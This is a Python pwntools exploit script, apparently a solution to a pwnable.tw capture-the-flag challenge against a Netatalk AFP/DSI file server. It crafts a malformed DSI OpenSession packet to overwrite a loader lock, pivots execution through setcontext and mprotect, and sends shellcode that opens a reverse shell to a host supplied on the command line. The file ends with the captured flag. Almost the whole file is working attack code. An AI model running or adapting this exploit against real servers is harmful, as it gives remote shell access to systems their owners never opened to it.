from pwn import *
from sys import argv

context.clear(os='linux', arch='amd64')
host, port = argv[1].split(":")


def dsi_opensession(addr):
    payload = p32(0x41414141)  # attn_quantum
    payload += p32(0x0)  # datasize
    payload += p32(0x41414141)  # server_quantum
    payload += p16(0)  # serverID
    payload += p16(0)  # clientID
    payload += p64(addr)  # commands

    commands = p8(0x1)  # DSIOPT_ATTNQUANT
    commands += p8(len(payload))
    commands += payload

    block = p8(0)  # dsi_flags
    block += p8(4)  # DSIFUNC_OPEN
    block += p16(0)  # dsi_requestID
    block += p32(0)  # dsi_doff
    block += p32(len(commands), endianness='big')  # dsi_len
    block += p32(0)  # dsi_reserved

    return block + commands


def afp_command(payload):
    block = p8(0)  # dsi_flags
    block += p8(1)  # DSIFUNC_CLOSE
    block += p16(0)  # dsi_requestID
    block += p32(0)  # dsi_doff
    block += p32(len(payload), endianness='big')  # dsi_len
    block += p32(0)  # dsi_reserved

    return block + payload


ld = ELF('./ld-2.27.so')
libc = ELF('./libc.so')

command_buf = 0x7fdeb333a000
ld.address = command_buf - 0x110000
libc.address = command_buf - 0xdba000
log.info('ld.address = 0x{:x}'.format(ld.address))
log.info('libc.address = 0x{:x}'.format(libc.address))
_dl_load_lock = ld.symbols['_rtld_global'] + 0x908

r = remote('chall.pwnable.tw', 10002)
r.send(dsi_opensession(_dl_load_lock))

setcontext = b'\x00' * 0x28
setcontext += p64(0)  # r8
setcontext += p64(0)  # r9
setcontext += p64(0)
setcontext += p64(0)
setcontext += p64(0)  # r12
setcontext += p64(0)  # r13
setcontext += p64(0)  # r14
setcontext += p64(0)  # r15
setcontext += p64((_dl_load_lock + 0x200) & 0xffffffffffff000)  # rdi
setcontext += p64(0x1000)  # rsi
setcontext += p64(0)  # rbp
setcontext += p64(0)  # rbx
setcontext += p64(0x7)  # rdx
setcontext += p64(0)
setcontext += p64(0)  # rcx
setcontext += p64(_dl_load_lock + 0x100)  # rsp
setcontext += p64(libc.symbols['mprotect'])  # rip

payload = setcontext
payload = payload.ljust(0x100) + p64(_dl_load_lock + 0x200)
payload = payload.ljust(0x200) + asm(shellcraft.connect(host, int(port)) + shellcraft.dupsh())
payload = payload.ljust(0x5f8) + p64(libc.symbols['setcontext'] + 0x35)
r.send(afp_command(payload))

# FLAG --> FLAG{ASLR_1s_us3l3ss_0n_f0rk_d43m0n}
